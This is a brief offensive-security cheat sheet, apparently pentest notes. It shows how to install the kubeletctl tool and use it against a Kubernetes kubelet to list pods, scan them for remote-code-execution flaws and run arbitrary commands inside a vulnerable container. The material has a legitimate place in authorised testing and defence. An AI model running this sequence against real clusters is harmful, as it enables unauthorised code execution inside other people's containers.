Install Kubeletctl:
```
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.13/kubeletctl_linux_amd64 && chmod a+x ./kubeletctl_linux_amd64 && mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```

Enumerate pods:
```
kubeletctl --server <ip> pods
```

Scan pods for RCE vulns:
```
kubeletctl --server <ip> scan rce
```

If there's a vulnerable pod:
```
kubeletctl --server <ip> exec "<cmd>" -p <pod> -c <container>
```

